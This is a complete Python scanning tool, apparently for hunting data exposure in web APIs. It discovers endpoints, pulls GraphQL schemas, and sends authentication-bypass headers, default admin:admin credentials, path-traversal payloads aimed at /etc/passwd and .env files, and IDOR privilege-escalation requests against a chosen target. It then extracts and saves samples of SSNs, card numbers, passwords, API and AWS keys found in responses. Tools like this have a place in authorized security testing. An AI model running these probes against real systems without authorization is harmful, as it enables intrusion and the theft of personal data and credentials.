#!/usr/bin/env python3
"""
Advanced API Data Leakage Hunter - Data Exposure Discovery Tool
Tests API endpoints for excessive data exposure, privilege escalation, and sensitive information leakage
"""

import requests
import json
import threading
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
import base64
import hashlib
import random
import string

class APIDataHunter:
    def __init__(self, base_url, threads=10, timeout=10):
        self.base_url = base_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings = []
        self.endpoints = []
        self.auth_tokens = {}
        
        # Common API endpoints to test
        self.api_paths = [
            '/api/v1', '/api/v2', '/api/v3', '/api',
            '/rest/v1', '/rest/v2', '/rest',
            '/graphql', '/graph',
            '/admin/api', '/admin',
            '/internal/api', '/internal',
            '/private/api', '/private',
            '/dev/api', '/dev',
            '/test/api', '/test',
            '/staging/api', '/staging'
        ]
        
        # Common resource endpoints
        self.resources = [
            'users', 'user', 'accounts', 'account', 'profiles', 'profile',
            'customers', 'customer', 'clients', 'client',
            'orders', 'order', 'transactions', 'transaction',
            'payments', 'payment', 'billing', 'invoice',
            'products', 'product', 'items', 'item',
            'files', 'file', 'documents', 'document',
            'reports', 'report', 'analytics', 'stats',
            'settings', 'config', 'configuration',
            'logs', 'log', 'audit', 'history',
            'admin', 'administrator', 'staff',
            'roles', 'role', 'permissions', 'permission'
        ]
        
        # Sensitive data patterns
        self.sensitive_patterns = {
            'Email Addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'Phone Numbers': r'(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}',
            'SSN': r'\b\d{3}-\d{2}-\d{4}\b',
            'Credit Card': r'\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b',
            'API Keys': r'(?:api[_-]?key|access[_-]?token|secret[_-]?key)["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-_]{20,})',
            'JWT Tokens': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            'AWS Keys': r'AKIA[0-9A-Z]{16}',
            'Database URLs': r'(?:mongodb|mysql|postgresql|redis)://[^\s\'"]+',
            'Private Keys': r'-----BEGIN [A-Z]+ PRIVATE KEY-----',
            'Passwords': r'(?:password|passwd|pwd)["\']?\s*[:=]\s*["\']?([^\s\'"]{6,})',
            'Internal IPs': r'\b(?:10\.|172\.(?:1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)\d{1,3}\.\d{1,3}\b',
            'File Paths': r'(?:[A-Za-z]:|/)(?:[^\s<>"*?|]{1,255}[/\\])*[^\s<>"*?|/\\]{1,255}',
            'Hashes': r'\b[a-f0-9]{32}\b|\b[a-f0-9]{40}\b|\b[a-f0-9]{64}\b'
        }
        
        # HTTP methods to test
        self.methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        
        # Authentication bypass techniques
        self.bypass_headers = [
            {'X-Original-User': 'admin'},
            {'X-Forwarded-User': 'admin'},
            {'X-Remote-User': 'admin'},
            {'X-User': 'admin'},
            {'X-Username': 'admin'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'Cluster-Client-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Is-Admin': '1'},
            {'X-Role': 'admin'},
            {'Authorization': 'Bearer admin'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # admin:admin
            {'X-HTTP-Method-Override': 'GET'},
            {'X-Method-Override': 'GET'}
        ]

    def discover_endpoints(self):
        """Discover API endpoints through various techniques"""
        print(f"[+] Discovering API endpoints for {self.base_url}")
        
        discovered = set()
        
        # Check common API paths
        for api_path in self.api_paths:
            url = urljoin(self.base_url, api_path)
            
            try:
                response = requests.get(url, timeout=self.timeout)
                if response.status_code in [200, 401, 403]:
                    discovered.add(api_path)
                    print(f"[+] Found API path: {api_path}")
                    
                    # Try to discover resources under this path
                    for resource in self.resources:
                        resource_url = f"{api_path}/{resource}"
                        full_url = urljoin(self.base_url, resource_url)
                        
                        try:
                            res_response = requests.get(full_url, timeout=5)
                            if res_response.status_code in [200, 401, 403, 405]:
                                discovered.add(resource_url)
                                
                                # Try with ID parameter
                                id_variants = [f"{resource_url}/1", f"{resource_url}/me", 
                                             f"{resource_url}/admin", f"{resource_url}/test"]
                                
                                for variant in id_variants:
                                    try:
                                        var_response = requests.get(urljoin(self.base_url, variant), timeout=3)
                                        if var_response.status_code in [200, 401, 403]:
                                            discovered.add(variant)
                                    except:
                                        pass
                        except:
                            pass
                            
            except:
                pass
        
        # Try to find GraphQL endpoints
        graphql_paths = ['/graphql', '/graph', '/api/graphql', '/api/graph', '/v1/graphql']
        for path in graphql_paths:
            try:
                url = urljoin(self.base_url, path)
                # GraphQL introspection query
                introspection_query = {
                    "query": "{ __schema { types { name } } }"
                }
                response = requests.post(url, json=introspection_query, timeout=self.timeout)
                if response.status_code == 200 and 'data' in response.text:
                    discovered.add(path)
                    print(f"[+] Found GraphQL endpoint: {path}")
                    self._analyze_graphql_schema(url)
            except:
                pass
        
        # Try to discover through robots.txt and sitemap
        try:
            robots_response = requests.get(urljoin(self.base_url, '/robots.txt'), timeout=5)
            if robots_response.status_code == 200:
                for line in robots_response.text.split('\n'):
                    if line.strip().startswith('Disallow:') or line.strip().startswith('Allow:'):
                        path = line.split(':', 1)[1].strip()
                        if '/api' in path.lower():
                            discovered.add(path)
        except:
            pass
            
        self.endpoints = list(discovered)
        print(f"[+] Discovered {len(self.endpoints)} API endpoints")
        return self.endpoints

    def _analyze_graphql_schema(self, url):
        """Analyze GraphQL schema for sensitive queries"""
        introspection_query = {
            "query": """
            query IntrospectionQuery {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
                types {
                  ...FullType
                }
              }
            }
            
            fragment FullType on __Type {
              kind
              name
              description
              fields(includeDeprecated: true) {
                name
                description
                args {
                  ...InputValue
                }
                type {
                  ...TypeRef
                }
                isDeprecated
                deprecationReason
              }
              inputFields {
                ...InputValue
              }
              interfaces {
                ...TypeRef
              }
              enumValues(includeDeprecated: true) {
                name
                description
                isDeprecated
                deprecationReason
              }
              possibleTypes {
                ...TypeRef
              }
            }
            
            fragment InputValue on __InputValue {
              name
              description
              type { ...TypeRef }
              defaultValue
            }
            
            fragment TypeRef on __Type {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
            """
        }
        
        try:
            response = requests.post(url, json=introspection_query, timeout=self.timeout)
            if response.status_code == 200:
                schema = response.json()
                
                # Extract sensitive field names
                sensitive_fields = []
                if 'data' in schema and '__schema' in schema['data']:
                    types = schema['data']['__schema']['types']
                    
                    for type_def in types:
                        if type_def.get('fields'):
                            for field in type_def['fields']:
                                field_name = field['name'].lower()
                                if any(keyword in field_name for keyword in 
                                      ['password', 'secret', 'token', 'key', 'admin', 'private']):
                                    sensitive_fields.append({
                                        'type': type_def['name'],
                                        'field': field['name'],
                                        'description': field.get('description', '')
                                    })
                
                if sensitive_fields:
                    self.findings.append({
                        'type': 'GraphQL Sensitive Fields',
                        'url': url,
                        'method': 'POST',
                        'severity': 'High',
                        'details': f"Found {len(sensitive_fields)} sensitive fields in GraphQL schema",
                        'sensitive_fields': sensitive_fields,
                        'business_impact': 'Potential data exposure through GraphQL queries'
                    })
                    
        except Exception as e:
            pass

    def test_endpoint_data_exposure(self, endpoint):
        """Test a single endpoint for data exposure vulnerabilities"""
        url = urljoin(self.base_url, endpoint)
        findings = []
        
        # Test different HTTP methods
        for method in self.methods:
            try:
                # Basic request
                response = requests.request(method, url, timeout=self.timeout)
                
                if response.status_code == 200:
                    finding = self._analyze_response_data(url, method, response, 'Basic Request')
                    if finding:
                        findings.append(finding)
                
                # Test with authentication bypass headers
                for bypass_header in self.bypass_headers:
                    try:
                        bypass_response = requests.request(
                            method, url, 
                            headers=bypass_header, 
                            timeout=self.timeout
                        )
                        
                        if bypass_response.status_code == 200:
                            finding = self._analyze_response_data(
                                url, method, bypass_response, 
                                f'Auth Bypass ({list(bypass_header.keys())[0]})'
                            )
                            if finding:
                                findings.append(finding)
                                
                    except:
                        pass
                        
                # Test parameter manipulation
                if '?' in url:
                    findings.extend(self._test_parameter_manipulation(url, method))
                    
                # Test path traversal
                findings.extend(self._test_path_traversal(url, method))
                
            except:
                pass
        
        return findings

    def _analyze_response_data(self, url, method, response, technique):
        """Analyze response data for sensitive information"""
        try:
            content = response.text
            content_type = response.headers.get('Content-Type', '').lower()
            
            # Check for JSON responses with data arrays/objects
            if 'json' in content_type:
                try:
                    data = response.json()
                    return self._analyze_json_data(url, method, data, technique, response)
                except:
                    pass
            
            # Check for XML responses
            elif 'xml' in content_type:
                return self._analyze_xml_data(url, method, content, technique, response)
            
            # Check text responses for sensitive patterns
            else:
                return self._analyze_text_data(url, method, content, technique, response)
                
        except Exception as e:
            return None

    def _analyze_json_data(self, url, method, data, technique, response):
        """Analyze JSON response for sensitive data exposure"""
        sensitive_data = {}
        record_count = 0
        
        # Count records in response
        if isinstance(data, list):
            record_count = len(data)
            sample_data = data[:5] if data else []
        elif isinstance(data, dict):
            if 'data' in data and isinstance(data['data'], list):
                record_count = len(data['data'])
                sample_data = data['data'][:5]
            elif 'results' in data and isinstance(data['results'], list):
                record_count = len(data['results'])
                sample_data = data['results'][:5]
            elif 'items' in data and isinstance(data['items'], list):
                record_count = len(data['items'])
                sample_data = data['items'][:5]
            else:
                record_count = 1
                sample_data = [data]
        else:
            return None
        
        # Check for sensitive patterns in the data
        data_str = json.dumps(data, default=str)
        
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, data_str, re.IGNORECASE)
            if matches:
                sensitive_data[pattern_name] = {
                    'count': len(matches),
                    'samples': matches[:5]  # First 5 matches
                }
        
        # Check for excessive data exposure (large record counts)
        severity = 'Low'
        business_impact = 'Minor data exposure'
        
        if record_count > 1000:
            severity = 'High'
            business_impact = f'Mass data exposure: {record_count} records accessible'
        elif record_count > 100:
            severity = 'Medium'
            business_impact = f'Moderate data exposure: {record_count} records accessible'
        elif sensitive_data:
            severity = 'High'
            business_impact = f'Sensitive data exposed: {", ".join(sensitive_data.keys())}'
        elif record_count > 10:
            severity = 'Medium'
            business_impact = f'Multiple records exposed: {record_count} records'
        
        if sensitive_data or record_count > 5:
            return {
                'type': 'API Data Exposure',
                'url': url,
                'method': method,
                'technique': technique,
                'severity': severity,
                'record_count': record_count,
                'sensitive_data': sensitive_data,
                'sample_data': sample_data,
                'response_size': len(response.content),
                'business_impact': business_impact,
                'details': f'Endpoint exposes {record_count} records with potential sensitive data'
            }
        
        return None

    def _analyze_xml_data(self, url, method, content, technique, response):
        """Analyze XML response for sensitive data"""
        sensitive_data = {}
        
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                sensitive_data[pattern_name] = {
                    'count': len(matches),
                    'samples': matches[:5]
                }
        
        if sensitive_data:
            return {
                'type': 'XML Data Exposure',
                'url': url,
                'method': method,
                'technique': technique,
                'severity': 'Medium',
                'sensitive_data': sensitive_data,
                'response_size': len(response.content),
                'business_impact': f'Sensitive data in XML response: {", ".join(sensitive_data.keys())}'
            }
        
        return None

    def _analyze_text_data(self, url, method, content, technique, response):
        """Analyze text response for sensitive data"""
        sensitive_data = {}
        
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                sensitive_data[pattern_name] = {
                    'count': len(matches),
                    'samples': matches[:3]
                }
        
        if sensitive_data:
            return {
                'type': 'Text Data Exposure',
                'url': url,
                'method': method,
                'technique': technique,
                'severity': 'Medium',
                'sensitive_data': sensitive_data,
                'response_size': len(response.content),
                'business_impact': f'Sensitive data in text response: {", ".join(sensitive_data.keys())}'
            }
        
        return None

    def _test_parameter_manipulation(self, url, method):
        """Test parameter manipulation for data exposure"""
        findings = []
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # Test parameter manipulation techniques
        manipulations = [
            {'limit': '999999'},  # Try to get all records
            {'size': '999999'},
            {'count': '999999'},
            {'per_page': '999999'},
            {'max': '999999'},
            {'admin': 'true'},
            {'debug': 'true'},
            {'format': 'json'},
            {'include': 'all'},
            {'fields': '*'},
            {'select': '*'},
            {'expand': 'all'}
        ]
        
        for manipulation in manipulations:
            try:
                # Merge existing params with manipulation
                test_params = {**params}
                test_params.update(manipulation)
                
                # Flatten params (parse_qs returns lists)
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                
                response = requests.request(
                    method, f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                    params=flat_params,
                    timeout=self.timeout
                )
                
                if response.status_code == 200:
                    finding = self._analyze_response_data(
                        url, method, response, 
                        f'Parameter Manipulation ({list(manipulation.keys())[0]})'
                    )
                    if finding:
                        findings.append(finding)
                        
            except:
                pass
        
        return findings

    def _test_path_traversal(self, url, method):
        """Test path traversal techniques on API endpoints"""
        findings = []
        
        # Path traversal payloads
        traversal_payloads = [
            '../',
            '../../',
            '../../../',
            '..../',
            '....//....//....//..../',
            '%2e%2e%2f',
            '%2e%2e/',
            '..%2f',
            '..%5c',
            '..\\',
            '..\\'
        ]
        
        # Common files to try to access
        target_files = [
            'etc/passwd',
            'etc/hosts',
            'windows/system32/drivers/etc/hosts',
            'config.php',
            '.env',
            'config.json',
            'settings.py',
            'web.config'
        ]
        
        for payload in traversal_payloads:
            for target_file in target_files:
                try:
                    traversal_url = url + payload + target_file
                    response = requests.request(method, traversal_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # Check if response contains file-like content
                        content = response.text.lower()
                        
                        file_indicators = [
                            'root:', 'bin:', 'daemon:',  # /etc/passwd
                            'localhost', '127.0.0.1',    # hosts file
                            'database_', 'db_',          # config files
                            '<?php', '<?xml',            # code files
                            'secret', 'password', 'key'  # sensitive configs
                        ]
                        
                        if any(indicator in content for indicator in file_indicators):
                            findings.append({
                                'type': 'Path Traversal Data Exposure',
                                'url': traversal_url,
                                'method': method,
                                'technique': f'Path Traversal ({payload})',
                                'severity': 'High',
                                'target_file': target_file,
                                'response_sample': response.text[:500],
                                'business_impact': f'File system access via path traversal: {target_file}'
                            })
                            
                except:
                    pass
        
        return findings

    def test_privilege_escalation(self, endpoint):
        """Test for privilege escalation vulnerabilities"""
        findings = []
        url = urljoin(self.base_url, endpoint)
        
        # Test different user ID manipulations
        if re.search(r'/\d+', endpoint) or '/me' in endpoint:
            escalation_tests = [
                (endpoint.replace('/me', '/1'), 'User ID 1 Access'),
                (endpoint.replace('/me', '/admin'), 'Admin User Access'),
                (endpoint.replace('/me', '/0'), 'Root User Access'),
                (re.sub(r'/\d+', '/admin', endpoint), 'Admin Access via ID'),
                (re.sub(r'/\d+', '/1', endpoint), 'User ID 1 Access'),
                (re.sub(r'/\d+', '/0', endpoint), 'Root Access via ID')
            ]
            
            for test_endpoint, technique in escalation_tests:
                try:
                    test_url = urljoin(self.base_url, test_endpoint)
                    response = requests.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        finding = self._analyze_response_data(test_url, 'GET', response, technique)
                        if finding:
                            finding['type'] = 'Privilege Escalation'
                            finding['severity'] = 'High'
                            finding['business_impact'] = f'Unauthorized access to other user data: {technique}'
                            findings.append(finding)
                            
                except:
                    pass
        
        return findings

    def hunt_api_data_exposure(self):
        """Main function to hunt for API data exposure"""
        print(f"[+] Starting API data exposure hunt on {self.base_url}")
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[-] No API endpoints discovered")
            return []
        
        print(f"[+] Testing {len(self.endpoints)} endpoints for data exposure...")
        
        # Test endpoints for data exposure
        all_findings = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_endpoint = {
                executor.submit(self.test_endpoint_data_exposure, endpoint): endpoint
                for endpoint in self.endpoints
            }
            
            for future in as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    findings = future.result()
                    if findings:
                        all_findings.extend(findings)
                        print(f"[!] Found {len(findings)} issues in {endpoint}")
                except Exception as e:
                    print(f"[!] Error testing {endpoint}: {e}")
        
        # Test for privilege escalation
        print(f"[+] Testing for privilege escalation...")
        
        for endpoint in self.endpoints:
            try:
                escalation_findings = self.test_privilege_escalation(endpoint)
                if escalation_findings:
                    all_findings.extend(escalation_findings)
                    print(f"[!] Found privilege escalation in {endpoint}")
            except Exception as e:
                pass
        
        self.findings = all_findings
        return all_findings

    def generate_report(self):
        """Generate comprehensive API data exposure report"""
        report = {
            'target': self.base_url,
            'scan_time': datetime.now().isoformat(),
            'endpoints_tested': len(self.endpoints),
            'summary': {
                'total_findings': len(self.findings),
                'critical_findings': len([f for f in self.findings if f.get('severity') == 'Critical']),
                'high_findings': len([f for f in self.findings if f.get('severity') == 'High']),
                'medium_findings': len([f for f in self.findings if f.get('severity') == 'Medium']),
                'low_findings': len([f for f in self.findings if f.get('severity') == 'Low'])
            },
            'findings': self.findings,
            'endpoints': self.endpoints
        }
        
        # Calculate business impact summary
        impact_categories = {}
        for finding in self.findings:
            finding_type = finding.get('type', 'Unknown')
            impact_categories[finding_type] = impact_categories.get(finding_type, 0) + 1
        
        report['impact_summary'] = impact_categories
        
        # Overall severity assessment
        severities = [f.get('severity', 'Low') for f in self.findings]
        if 'Critical' in severities:
            report['overall_severity'] = 'Critical'
        elif 'High' in severities:
            report['overall_severity'] = 'High'
        elif 'Medium' in severities:
            report['overall_severity'] = 'Medium'
        else:
            report['overall_severity'] = 'Low'
            
        return report

    def save_report(self, filename=None):
        """Save detailed report"""
        if not filename:
            domain = urlparse(self.base_url).netloc.replace('.', '_')
            filename = f"api_data_hunt_{domain}_{int(time.time())}.json"
            
        report = self.generate_report()
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n[+] Report saved to {filename}")
        return report

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Advanced API Data Exposure Hunter')
    parser.add_argument('url', help='Target URL to hunt for API data exposure')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('-o', '--output', help='Output file for report')
    
    args = parser.parse_args()
    
    hunter = APIDataHunter(args.url, args.threads, args.timeout)
    findings = hunter.hunt_api_data_exposure()
    
    print(f"\n{'='*60}")
    print("API DATA EXPOSURE HUNTING RESULTS")
    print(f"{'='*60}")
    
    if not findings:
        print("[-] No API data exposure vulnerabilities found")
        return
        
    # Group findings by severity
    severity_groups = {}
    for finding in findings:
        severity = finding.get('severity', 'Low')
        if severity not in severity_groups:
            severity_groups[severity] = []
        severity_groups[severity].append(finding)
    
    # Display findings
    for severity in ['Critical', 'High', 'Medium', 'Low']:
        if severity in severity_groups:
            print(f"\n{severity.upper()} SEVERITY FINDINGS:")
            print("-" * 40)
            
            for finding in severity_groups[severity][:5]:  # Show first 5 of each severity
                print(f"\n[!] {finding['type']}")
                print(f"    URL: {finding['url']}")
                print(f"    Method: {finding['method']}")
                print(f"    Technique: {finding['technique']}")
                print(f"    Impact: {finding['business_impact']}")
                
                if 'record_count' in finding:
                    print(f"    Records Exposed: {finding['record_count']}")
                
                if 'sensitive_data' in finding:
                    print(f"    Sensitive Data Types:")
                    for data_type, info in finding['sensitive_data'].items():
                        print(f"      - {data_type}: {info['count']} instances")
                        
            if len(severity_groups[severity]) > 5:
                print(f"\n    ... and {len(severity_groups[severity]) - 5} more {severity.lower()} findings")
    
    # Save report
    report = hunter.save_report(args.output)
    print(f"\n[+] Total Findings: {report['summary']['total_findings']}")
    print(f"[+] Overall Severity: {report['overall_severity']}")
    print(f"[+] Endpoints Tested: {report['endpoints_tested']}")

if __name__ == '__main__':
    main()